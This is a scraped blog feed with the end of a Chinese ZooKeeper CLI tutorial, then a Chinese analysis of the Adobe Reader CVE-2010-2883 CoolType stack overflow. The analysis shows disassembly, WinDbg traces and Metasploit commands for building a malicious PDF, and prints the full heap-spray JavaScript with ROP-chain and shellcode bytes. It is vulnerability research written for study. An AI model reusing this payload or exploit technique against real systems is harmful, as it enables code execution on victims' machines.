&lt;p align=&quot;justify&quot;&gt;&lt;em&gt;&lt;strong&gt;create [-s] [-e] [-c] [-t ttl] path [data] [acl] &lt;span&gt;创建节点&lt;/span&gt; &lt;span&gt;-s&lt;/span&gt;&lt;span&gt;序号节点&lt;/span&gt; &lt;span&gt;-e&lt;/span&gt;&lt;span&gt;临时节点&lt;/span&gt;&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p align=&quot;justify&quot;&gt;&lt;em&gt;&lt;strong&gt;Delete &lt;span&gt;删除节点（有子节点不能删除）&lt;/span&gt;&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p align=&quot;justify&quot;&gt;&lt;em&gt;&lt;strong&gt;Deleteall &lt;span&gt;删除节点（包含子节点）&lt;/span&gt;&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p align=&quot;justify&quot;&gt;&lt;em&gt;&lt;strong&gt;Delquota [-n] [-b] &lt;span&gt;删除配额（比如节点设置了数据大小限制）&lt;/span&gt; -n&lt;span&gt;数量  &lt;/span&gt;&lt;span&gt;-b&lt;/span&gt; &lt;span&gt;大小&lt;/span&gt;&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p align=&quot;justify&quot;&gt;&lt;em&gt;&lt;strong&gt;get [-s] [-w] path &lt;span&gt;查看节点&lt;/span&gt; -s&lt;span&gt;包含状态&lt;/span&gt; &lt;span&gt;-w&lt;/span&gt;&lt;span&gt;添加监听&lt;/span&gt;&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p align=&quot;justify&quot;&gt;&lt;em&gt;&lt;strong&gt;getAcl [-s]  path &lt;span&gt;获取权限配置&lt;/span&gt;&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p align=&quot;justify&quot;&gt;&lt;em&gt;&lt;strong&gt;History  &lt;span&gt;查看历史指令&lt;/span&gt;&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p align=&quot;justify&quot;&gt;&lt;em&gt;&lt;strong&gt;listquota path &lt;span&gt;当前节点有哪些配额&lt;/span&gt;&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p align=&quot;justify&quot;&gt;&lt;em&gt;&lt;strong&gt;ls [-s] [-w] [-R] path &lt;span&gt;查看所有子节点&lt;/span&gt; -R&lt;span&gt;递归查看所有子节点&lt;/span&gt;&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p align=&quot;justify&quot;&gt;&lt;em&gt;&lt;strong&gt;removewatches path [-c|-d|-a] [-l]   &lt;span&gt;删除监听&lt;/span&gt;&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p align=&quot;justify&quot;&gt;&lt;em&gt;&lt;strong&gt;set [-s] [-v version] path data  &lt;span&gt;修改数据&lt;/span&gt;&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p align=&quot;justify&quot;&gt;&lt;em&gt;&lt;strong&gt;setAcl [-s] [-v version] [-R] path acl &lt;span&gt;添加&lt;/span&gt;/&lt;span&gt;修改权限&lt;/span&gt;&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p align=&quot;justify&quot;&gt;&lt;em&gt;&lt;strong&gt;setquota -n|-b val path   &lt;span&gt;设置配额&lt;/span&gt;&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p align=&quot;justify&quot;&gt;&lt;em&gt;&lt;strong&gt;stat [-w] path   &lt;span&gt;查看状态&lt;/span&gt;&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p align=&quot;justify&quot;&gt;&lt;em&gt;&lt;strong&gt;sync path &lt;span&gt;强制同步节点数据&lt;/span&gt;&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p align=&quot;justify&quot;&gt; &lt;/p&gt;
&lt;p align=&quot;justify&quot;&gt;&lt;span&gt;知道了这些命令之后就可以玩一下了：&lt;/span&gt;&lt;/p&gt;
&lt;p align=&quot;justify&quot;&gt;Ls  /  &lt;span&gt;查看根节点，可以看到默认就有一个&lt;/span&gt;&lt;span&gt;zookeeper&lt;/span&gt;&lt;span&gt;节点&lt;/span&gt;&lt;/p&gt;
&lt;p align=&quot;justify&quot;&gt;&lt;span&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1216484/202010/1216484-20201017234639517-980478543.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/span&gt;&lt;/p&gt;



&lt;p align=&quot;justify&quot;&gt;&lt;strong&gt;&lt;span&gt;注意点：&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;span&gt;1.&lt;span&gt;创建节点要以&lt;/span&gt;&lt;span&gt;/&lt;/span&gt;&lt;span&gt;开始&lt;/span&gt;&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p align=&quot;justify&quot;&gt; &lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1216484/202010/1216484-20201017234649717-260466107.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;span&gt; 2.&lt;span&gt;创建节点只能一级一级的创建&lt;/span&gt;&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1216484/202010/1216484-20201017234700224-26810498.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;span&gt; 3.&lt;span&gt;临时节点不能创建子节点&lt;/span&gt;&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1216484/202010/1216484-20201017234712113-50250515.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/span&gt;&lt;/p&gt;


</description>
<pubDate>Sat, 17 Oct 2020 15:50:00 +0000</pubDate>
<dc:creator>白露非霜</dc:creator>
<og:description>一．ZK简述 Zookeeper，它是一个分布式程序的协调服务，它主要是用来解决分布式应用中的一些数据管理问题，比如集群管理，分布式应用配置，分布式锁，服务注册/发现等等。 它是一个类似于文件系统的树</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/nijunyang/p/13833127.html</dc:identifier>
</item>
<item>
<title>CVE-2010-2883-CoolType.dll缓冲区溢出漏洞分析 - Taolaw</title>
<link>http://www.cnblogs.com/Taolaw/p/13823479.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/Taolaw/p/13823479.html</guid>
<description>&lt;h2 id=&quot;前言&quot;&gt;前言&lt;/h2&gt;
&lt;p&gt;此漏洞是根据泉哥的《漏洞战争》来学习分析的，网上已有大量分析文章在此只是做一个独立的分析记录。&lt;/p&gt;
&lt;h2 id=&quot;复现环境&quot;&gt;复现环境&lt;/h2&gt;
&lt;blockquote&gt;
&lt;ul&gt;&lt;li&gt;操作系统 -&amp;gt; Windows XP Sp3&lt;/li&gt;
&lt;li&gt;软件版本 -&amp;gt; Adobe Reader 9.3.4&lt;/li&gt;
&lt;/ul&gt;&lt;/blockquote&gt;
&lt;h2 id=&quot;静态分析&quot;&gt;静态分析&lt;/h2&gt;
&lt;p&gt;如果根据泉哥的文章直接走倒是也没有啥问题，不过在学习的过程中倒是很想试一下如果没有更多提示的条件下是否可以走一遍整个流程。于是搜索这个漏洞的信息找到了一篇&lt;a href=&quot;https://nvd.nist.gov/vuln/detail/CVE-2010-2883&quot;&gt;NVD&lt;/a&gt;的文章，这里很明确的告诉了漏洞所在的库和&lt;code&gt;SING&lt;/code&gt;表的一些信息以及漏洞类型是一个栈溢出，在这些信息的基础上我们可以尝试静态分析一下&lt;code&gt;CoolType.dll&lt;/code&gt;来大概搜索一下漏洞可能出现的位置。其实注意看上下文的话，在 IDA中能很快看到紧邻&lt;code&gt;SING&lt;/code&gt;字符串的下方有一个&lt;code&gt;strcat&lt;/code&gt;函数的调用，这里就极有可能是漏洞位置了。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-c++&quot;&gt;.text:0803DCF9 var_160         = byte ptr -160h
.text:0803DCF9 var_140         = dword ptr -140h
.text:0803DCF9 var_138         = dword ptr -138h
.text:0803DCF9 var_134         = dword ptr -134h
.text:0803DCF9 var_130         = dword ptr -130h
.text:0803DCF9 var_12C         = dword ptr -12Ch
.text:0803DCF9 var_128         = dword ptr -128h
.text:0803DCF9 var_124         = dword ptr -124h
.text:0803DCF9 var_120         = dword ptr -120h
.text:0803DCF9 var_119         = byte ptr -119h
.text:0803DCF9 var_114         = dword ptr -114h
.text:0803DCF9 var_10C         = dword ptr -10Ch
.text:0803DCF9 var_108         = byte ptr -108h
.text:0803DCF9 var_4           = dword ptr -4
.text:0803DCF9 arg_0           = dword ptr  8
.text:0803DCF9 arg_4           = dword ptr  0Ch
.text:0803DCF9 arg_8           = dword ptr  10h
.text:0803DCF9 arg_C           = dword ptr  14h
.text:0803DCF9
.text:0803DCF9                 push    ebp
.text:0803DCFA                 sub     esp, 104h
.text:0803DD00                 lea     ebp, [esp-4]
.text:0803DD04                 mov     eax, ___security_cookie
.text:0803DD09                 xor     eax, ebp
.text:0803DD0B                 mov     [ebp+108h+var_4], eax
.text:0803DD11                 push    4Ch
.text:0803DD13                 mov     eax, offset sub_8184A54
.text:0803DD18                 call    __EH_prolog3_catch
.text:0803DD1D                 mov     eax, [ebp+108h+arg_C]
.text:0803DD23                 mov     edi, [ebp+108h+arg_0]
.text:0803DD29                 mov     ebx, [ebp+108h+arg_4]
.text:0803DD2F                 mov     [ebp+108h+var_130], edi
.text:0803DD32                 mov     [ebp+108h+var_138], eax
.text:0803DD35                 call    sub_804172C
.text:0803DD3A                 xor     esi, esi
.text:0803DD3C                 cmp     dword ptr [edi+8], 3
.text:0803DD40                 mov     [ebp+108h+var_10C], esi
.text:0803DD43                 jz      loc_803DF00
.text:0803DD49                 mov     [ebp+108h+var_124], esi
.text:0803DD4C                 mov     [ebp+108h+var_120], esi
.text:0803DD4F                 cmp     dword ptr [edi+0Ch], 1
.text:0803DD53                 mov     byte ptr [ebp+108h+var_10C], 1
.text:0803DD57                 jnz     loc_803DEA9
.text:0803DD5D                 push    offset aName    ; &quot;name&quot;
.text:0803DD62                 push    edi             ; int
.text:0803DD63                 lea     ecx, [ebp+108h+var_124]
.text:0803DD66                 mov     [ebp+108h+var_119], 0
.text:0803DD6A                 call    sub_80217D7
.text:0803DD6F                 cmp     [ebp+108h+var_124], esi
.text:0803DD72                 jnz     short loc_803DDDD
.text:0803DD74                 push    offset aSing    ; &quot;SING&quot;
.text:0803DD79                 push    edi             ; int
.text:0803DD7A                 lea     ecx, [ebp+108h+var_12C]
.text:0803DD7D                 call    sub_8021B06
.text:0803DD82                 mov     eax, [ebp+108h+var_12C]
.text:0803DD85                 cmp     eax, esi
.text:0803DD87                 mov     byte ptr [ebp+108h+var_10C], 2
.text:0803DD8B                 jz      short loc_803DDC4
.text:0803DD8D                 mov     ecx, [eax]
.text:0803DD8F                 and     ecx, 0FFFFh
.text:0803DD95                 jz      short loc_803DD9F
.text:0803DD97                 cmp     ecx, 100h
.text:0803DD9D                 jnz     short loc_803DDC0
.text:0803DD9F
.text:0803DD9F loc_803DD9F:                            ; CODE XREF: sub_803DCF9+9Cj
.text:0803DD9F                 add     eax, 10h
.text:0803DDA2                 push    eax             ; char *
.text:0803DDA3                 lea     eax, [ebp+108h+var_108]
.text:0803DDA6                 push    eax             ; char *
.text:0803DDA7                 mov     [ebp+108h+var_108], 0
.text:0803DDAB                 call    strcat
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;这里可以看到&lt;code&gt;strcat&lt;/code&gt;函数调用之前确实没有进行长度验证，如果只是单纯的看这段汇编代码可能很难和整个漏洞联系起来，于是我们要动态调试来看一看。&lt;/p&gt;
&lt;h2 id=&quot;动态调试&quot;&gt;动态调试&lt;/h2&gt;
&lt;p&gt;首先，我们利用&lt;code&gt;msf&lt;/code&gt;生成一个样本，为了后面的调试方便，最好先改一下exp的源码，linux下msf的&lt;code&gt;exp&lt;/code&gt;在&lt;code&gt;/opt/metasploit-framework/embedded/framework/modules/exploits/windows/fileformat&lt;/code&gt;目录下，随后我们找到&lt;code&gt;adobe_cooltype_sing.rb&lt;/code&gt;文件，注释掉其中的第&lt;code&gt;102&lt;/code&gt;行，恢复&lt;code&gt;101&lt;/code&gt;行，这里为了不被检测到用了随机数据的方式来填充的，但是这不利于调试。然后设置&lt;code&gt;payload&lt;/code&gt;，命令行如下&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-bash&quot;&gt;msf6 exploit(windows/fileformat/adobe_cooltype_sing) &amp;gt; set filename calc.pdf
filename =&amp;gt; calc.pdf
msf6 exploit(windows/fileformat/adobe_cooltype_sing) &amp;gt; set payload windows/exec 
payload =&amp;gt; windows/exec
msf6 exploit(windows/fileformat/adobe_cooltype_sing) &amp;gt; set cmd calc.exe
cmd =&amp;gt; calc.exe
msf6 exploit(windows/fileformat/adobe_cooltype_sing) &amp;gt; run
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;然后我们用&lt;code&gt;windbg&lt;/code&gt;打开Adober Reader，用&lt;code&gt;sxe ld CoolType&lt;/code&gt;在程序加载CoolType.dll的时候下断，随后执行，加上IDA中的静态分析我们可以知道&lt;code&gt;strcat&lt;/code&gt;函数的偏移，于是我们在strcat处下断&lt;code&gt;bp 0803DDAB&lt;/code&gt; ，打开poc，继续执行，这里我们看到调用strcat函数之前的函数参数如下&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-cpp&quot;&gt;0:000&amp;gt; dd esp
0013e468  0013e4d8 03395fb4 07e5c04f 00000004
0013e478  0013e6d0 00000000 0341f250 0341f0d0
0013e488  03685db0 03685dac 0013e4c0 78147548
0013e498  0341f0d0 03685db0 000001fc 00000004
0013e4a8  0013e700 0013e6d0 0013e718 03395fa4
0013e4b8  00001ddf 00000000 00000000 00e5b9cc
0013e4c8  0013e470 0013e70c 08184a54 00000002
0013e4d8  0013e400 0013e6b0 00000000 07e5c1d7
0:000&amp;gt; dd 0013e4d8 
0013e4d8  0013e400 0013e6b0 00000000 07e5c1d7
0013e4e8  0013e858 0823ae9c 080852ef 0823a650
0013e4f8  03685dac 08080d0b 0341f0c4 0013e4d4
0013e508  0013e550 010ff8af ffffffff 00e5b9dc
0013e518  00f4a90a 0013e584 0013e594 0013e580
0013e528  0013e57c 00f4a949 07e5d872 00000004
0013e538  0013e6b0 00000000 0013e540 00f4a90a
0013e548  0013e5b0 0013e5c0 0013e5d4 010fc97e
0:000&amp;gt; dd 03395fb4 
03395fb4  41414141 41414141 4a82a714 0c0c0c0c
03395fc4  41414141 41414141 41414141 41414141
03395fd4  41414141 41414141 41414141 41414141
03395fe4  41414141 41414141 41414141 41414141
03395ff4  41414141 41414141 41414141 41414141
03396004  41414141 41414141 41414141 41414141
03396014  41414141 41414141 41414141 41414141
03396024  41414141 41414141 41414141 41414141
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;调试到这一步基本验证了之前的想法，漏洞确实在此处strcat的位置。此时我们用&lt;code&gt;pdfStreamDumper&lt;/code&gt;这个工具来分析一下样本pdf，将对应的object保存到本地如下&lt;/p&gt;
&lt;center&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1278763/202010/1278763-20201015221502072-1441417207.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;/center&gt;
由于Adobe font官网2018的改版原来介绍`SING`表数据结构的文档暂时未找到，根据泉哥书中的介绍SING字符串偏移`0x11c`以后就是SING表的真实数据，也就是A字符串填充开始的地方，strcat的复制拼接也是从这里开始的。这里复制的长度为0x23C，从书中提供的`SING`表的数据结构来看这里接受的最大长度是`28byte`，复制的长度远远超过了缓冲区的长度。在确定了漏洞的位置以后，我们就来学一学此漏洞的利用，尽量从`exp`的作者来考虑这个问题。
&lt;h2 id=&quot;漏洞利用&quot;&gt;漏洞利用&lt;/h2&gt;
&lt;p&gt;首先我们需要罗列一下这个版本的Adobe Reader都开启了哪些安全机制&lt;/p&gt;
&lt;blockquote&gt;
&lt;ul&gt;&lt;li&gt;GS，又称&lt;code&gt;canary&lt;/code&gt;，通过在函数返回前压入栈的随机值是否被覆盖来决定是否抛出异常，或者继续执行代码&lt;/li&gt;
&lt;li&gt;DEP，堆栈不可执行保护，标记了堆栈读写属性，完全关闭了执行的权限&lt;/li&gt;
&lt;li&gt;ASLR，地址随机化，程序每次加载的内存位置不固定，在此版本的Reader中应该未覆盖到此模块&lt;/li&gt;
&lt;/ul&gt;&lt;/blockquote&gt;
&lt;p&gt;首先我们来看一下&lt;code&gt;GS&lt;/code&gt;的通用绕过策略，通常包括以下几种方法&lt;/p&gt;
&lt;blockquote&gt;
&lt;ul&gt;&lt;li&gt;利用未开启&lt;code&gt;GS&lt;/code&gt;安全机制的内存&lt;/li&gt;
&lt;li&gt;覆盖异常处理机制(SEH)的指针，程序触发异常后劫持程序执行流，如果程序启用safeSEH则需要另外考虑&lt;/li&gt;
&lt;li&gt;利用C++函数的虚表指针，覆盖虚函数的指针，在溢出后，函数返回之前就劫持程序流程&lt;/li&gt;
&lt;li&gt;信息泄露，利用条件比较受限&lt;/li&gt;
&lt;/ul&gt;&lt;/blockquote&gt;
&lt;p&gt;我们分析一下手头的样本，看作者利用了哪些方法来绕过&lt;code&gt;GS&lt;/code&gt;的，观察一下复制了内容以后的栈空间和之前的对比，如下所示&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;复制之前1&lt;/strong&gt;&lt;/p&gt;
&lt;center&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1278763/202010/1278763-20201015234101659-590314951.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;/center&gt;
&lt;p&gt;&lt;strong&gt;复制之后1&lt;/strong&gt;&lt;/p&gt;
&lt;center&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1278763/202010/1278763-20201015234148098-1684153942.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;/center&gt;
&lt;p&gt;&lt;strong&gt;复制之前2&lt;/strong&gt;&lt;/p&gt;
&lt;center&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1278763/202010/1278763-20201015234710199-1811455420.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;/center&gt;
&lt;p&gt;&lt;strong&gt;复制之后2&lt;/strong&gt;&lt;/p&gt;
&lt;center&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1278763/202010/1278763-20201015234729034-1467401785.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;/center&gt;
&lt;p&gt;&lt;strong&gt;复制之前3&lt;/strong&gt;&lt;/p&gt;
&lt;center&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1278763/202010/1278763-20201015234751904-247610784.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;/center&gt;
&lt;p&gt;&lt;strong&gt;复制之后3&lt;/strong&gt;&lt;/p&gt;
&lt;center&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1278763/202010/1278763-20201015234807481-371593127.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;/center&gt;
&lt;p&gt;从这几处的对比可以看出，作者溢出缓冲区只是覆盖了几个关键的位置，那么这几个关键的位置究竟是做什么用的呢？通过单步跟踪的方式，我们最终跟踪到了一处调用，如下所示&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-cpp&quot;&gt;0:000&amp;gt; p
eax=0013e6d0 ebx=00000000 ecx=0013dd44 edx=00000000 esi=0224b760 edi=0013e718
eip=0808b308 esp=0013dd28 ebp=0013dd48 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200202
CoolType!CTInit+0x44c65:
*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Program Files\Adobe\Reader 9.0\Reader\icucnv36.dll - 
0808b308 ff10            call    dword ptr [eax]      ds:0023:0013e6d0=4a80cb38
0:000&amp;gt; dd eax
0013e6d0  4a80cb38 41414141 41414141 41414141
0013e6e0  41414141 41414141 41414141 41414141
0013e6f0  41414141 41414141 41414141 41414141
0013e700  41414141 41414141 41414141 41414141
0013e710  41414141 0000006c 00000000 0000006d
0013e720  00000001 00000001 00000000 04835f84
0013e730  0483cae0 000026ec 0483c750 00000000
0013e740  0483c758 00000200 0483c758 080833ef
0:000&amp;gt; u 4a80cb38 
icucnv36!ucnv_toUChars_3_6+0x162:
4a80cb38 81c594070000    add     ebp,794h
4a80cb3e c9              leave
4a80cb3f c3              ret
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;可以看到此处的函数调用的地址刚好是覆盖后的特殊字段，对其进行反汇编可以发现其作用是将栈拉低&lt;code&gt;0x794&lt;/code&gt;的地址长度然后返回，很明显这里已经是作者布置好的&lt;code&gt;ROP&lt;/code&gt;链，这用来绕过上面所说的&lt;code&gt;DEP&lt;/code&gt;机制，跟踪的过程中发现此处还未执行到&lt;code&gt;strcat&lt;/code&gt;函数所在函数块的正常返回的位置，那么可以初步确定绕过&lt;code&gt;GS&lt;/code&gt;的方法用的就是覆盖C++虚函数的方式，那么上面被&lt;code&gt;4a80cb38&lt;/code&gt;所覆盖的就是原本的C++的虚函数指针，这里选择&lt;code&gt;4a80cb38&lt;/code&gt;作为&lt;code&gt;ROP&lt;/code&gt;的地址的一部分是因为其所在的&lt;code&gt;icucnv36.dll&lt;/code&gt;基本在之前的大部分版本中都保持不变，所以极大提高了exp的通用性。我们跟进去，看看这里返回以后是哪里&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-cpp&quot;&gt;0:000&amp;gt; t
eax=0013e6d0 ebx=00000000 ecx=0013dd44 edx=00000000 esi=0224b760 edi=0013e718
eip=4a80cb38 esp=0013dd24 ebp=0013dd48 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200202
icucnv36!ucnv_toUChars_3_6+0x162:
4a80cb38 81c594070000    add     ebp,794h
0:000&amp;gt; p
eax=0013e6d0 ebx=00000000 ecx=0013dd44 edx=00000000 esi=0224b760 edi=0013e718
eip=4a80cb3e esp=0013dd24 ebp=0013e4dc iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200202
icucnv36!ucnv_toUChars_3_6+0x168:
4a80cb3e c9              leave
0:000&amp;gt; p
eax=0013e6d0 ebx=00000000 ecx=0013dd44 edx=00000000 esi=0224b760 edi=0013e718
eip=4a80cb3f esp=0013e4e0 ebp=41414141 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200202
icucnv36!ucnv_toUChars_3_6+0x169:
4a80cb3f c3              ret
0:000&amp;gt; dd esp
0013e4e0  4a82a714 0c0c0c0c 41414141 41414141
0013e4f0  41414141 41414141 41414141 41414141
0013e500  41414141 41414141 41414141 41414141
0013e510  41414141 41414141 41414141 41414141
0013e520  41414141 41414141 41414141 41414141
0013e530  41414141 41414141 41414141 41414141
0013e540  41414141 41414141 41414141 41414141
0013e550  41414141 41414141 41414141 41414141
0:000&amp;gt; u 4a82a714 
icucnv36!icu_3_6::CharacterIterator::setToStart+0x8:
4a82a714 5c              pop     esp
4a82a715 c3              ret
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;看到上面的指令，尤其是&lt;code&gt;0c0c0c0c&lt;/code&gt;这块地址，基本上已经确定了，这里使用的是&lt;code&gt;Heap Spray&lt;/code&gt;。这里通过把原来的栈内存释放到溢出以后的可控区域，然后在其中布置&lt;code&gt;ROP&lt;/code&gt;链地址，最后劫持寄存器到堆中指定地址，执行另外的&lt;code&gt;ROP&lt;/code&gt;链。既然是用&lt;code&gt;Heap Spray&lt;/code&gt;在堆中布局，那么pdf中一定内嵌了&lt;code&gt;js&lt;/code&gt;，我们看一下&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-js&quot;&gt;var var_unescape = unescape;
var shellcode = var_unescape('%u4141%u4141%u63a5%u4a80%u0000%u4a8a%u2196%u4a80%u1f90%u4a80%u903c%u4a84%ub692%u4a80%u1064%u4a80%u22c8%u4a85%u0000%u1000%u0000%u0000%u0000%u0000%u0002%u0000%u0102%u0000%u0000%u0000%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0008%u0000%ua8a6%u4a80%u1f90%u4a80%u9038%u4a84%ub692%u4a80%u1064%u4a80%uffff%uffff%u0000%u0000%u0040%u0000%u0000%u0000%u0000%u0001%u0000%u0000%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0008%u0000%ua8a6%u4a80%u1f90%u4a80%u9030%u4a84%ub692%u4a80%u1064%u4a80%uffff%uffff%u0022%u0000%u0000%u0000%u0000%u0000%u0000%u0001%u63a5%u4a80%u0004%u4a8a%u2196%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0030%u0000%ua8a6%u4a80%u1f90%u4a80%u0004%u4a8a%ua7d8%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0020%u0000%ua8a6%u4a80%u63a5%u4a80%u1064%u4a80%uaedc%u4a80%u1f90%u4a80%u0034%u0000%ud585%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u000a%u0000%ua8a6%u4a80%u1f90%u4a80%u9170%u4a84%ub692%u4a80%uffff%uffff%uffff%uffff%uffff%uffff%u1000%u0000%udbb8%u1039%uda5b%ud9da%u2474%u5af4%uc931%u31b1%uea83%u31fc%u0f42%u4203%udbd4%ua7e5%u9902%u5806%ufed2%ubd8f%u3ee3%ub6eb%u8f53%u9a7f%u645f%u0f2d%u08d4%u20fa%ua65d%u0fdc%u9b5e%u111d%ue6dc%uf171%u28dd%uf084%u541a%ua065%u12f3%u55d8%u6e70%udee1%u7eca%u0261%u819a%u9540%udb91%u1742%u5076%u0fcb%u5d9b%ua485%u296f%u6d14%ud2be%u50bb%u210f%u95c5%udab7%uefb0%u67c4%u2bc3%ub3b7%ua846%u371f%u14f0%u949e%ude67%u51ac%ub8e3%u64b0%ub320%uedcc%u14c7%ub545%ub0e3%u6d0e%ue18d%uc0ea%uf2b2%ubc55%u7816%ua97b%u232a%u2c11%u59b8%u2e57%u61c2%u47c7%ueaf3%u1088%u390c%uefed%u6046%u7847%uf00f%ue5da%u2eb0%u1018%udb33%ue7e0%uae2b%uace5%u42eb%ubd97%u6499%ubd04%u068b%u2dcb%ue757%ud66e%uf7f2');
var var_c = var_unescape(&quot;%&quot; + &quot;u&quot; + &quot;0&quot; + &quot;c&quot; + &quot;0&quot; + &quot;c&quot; + &quot;%u&quot; + &quot;0&quot; + &quot;c&quot; + &quot;0&quot; + &quot;c&quot;);

while (var_c.length + 20 + 8 &amp;lt; 65536) {
    var_c += var_c;
}

sp = var_c.substring(0, (0x0c0c - 0x24) / 2);
sp += shellcode;
sp += var_c;
slackspace = sp.substring(0, 65536 / 2);
while (slackspace.length &amp;lt; 0x80000) {
    slackspace += slackspace;
}
bigblock = slackspace.substring(0, 0x80000 - (0x1020 - 0x08) / 2);
var memory = new Array();
for (count = 0; count &amp;lt; 0x1f0; count++) {
    memory[count] = bigblock + &quot;s&quot;
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;通过观察这段&lt;code&gt;js&lt;/code&gt;的代码，我们发现其基本上就是将&lt;code&gt;0c0c0c0c + shellcode + 0c0c0c0c&lt;/code&gt;这样的&quot;肉夹馍&quot;(一份大概&lt;code&gt;32k&lt;/code&gt;)整了&lt;code&gt;200+M&lt;/code&gt;。这样覆盖到&lt;code&gt;0x0c0c0c0c&lt;/code&gt;这个地址基本不是什么问题。用这样的方式布置&lt;code&gt;shellcode&lt;/code&gt;也基本不用考虑&lt;code&gt;ASLR&lt;/code&gt;的影响了。随后我们分析一下&lt;code&gt;shellcode&lt;/code&gt;所做的操作，&lt;code&gt;shellcode&lt;/code&gt;也是用了&lt;code&gt;ROP&lt;/code&gt;来做实现的&lt;/p&gt;
&lt;center&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1278763/202010/1278763-20201017213110078-1414512456.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;/center&gt;
&lt;center&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1278763/202010/1278763-20201017213219163-1712895273.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;/center&gt;
&lt;center&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1278763/202010/1278763-20201017213315732-1315715702.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;/center&gt;
